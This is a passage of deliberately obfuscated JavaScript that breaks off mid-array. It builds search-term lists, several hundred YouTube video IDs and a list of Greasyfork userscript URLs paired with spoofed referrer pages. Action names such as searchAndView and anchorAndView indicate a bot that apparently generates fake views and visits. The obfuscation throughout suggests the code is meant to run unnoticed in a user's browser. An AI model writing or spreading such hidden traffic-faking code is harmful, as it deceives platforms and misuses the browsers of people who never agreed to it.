searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](-0xc95 + 0xf09 + 0x26a * -0x1)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](0x2072 + 0xbfe + -0x2c66)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + W(0x2))['split'](',')), searchTerms = searchTerms['flat'](-0x3 * 0x841 + 0x7d9 + 0x7 * 0x26b);
const hookPlaylistPoints = [
    X(0x11, '%(os') + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    X(0x17, '%HNF') + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    Y(0xa) + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    Y(0x16) + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    Y(0x9) + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': Y(0xf) + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + X(0x15, ']l&y') + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
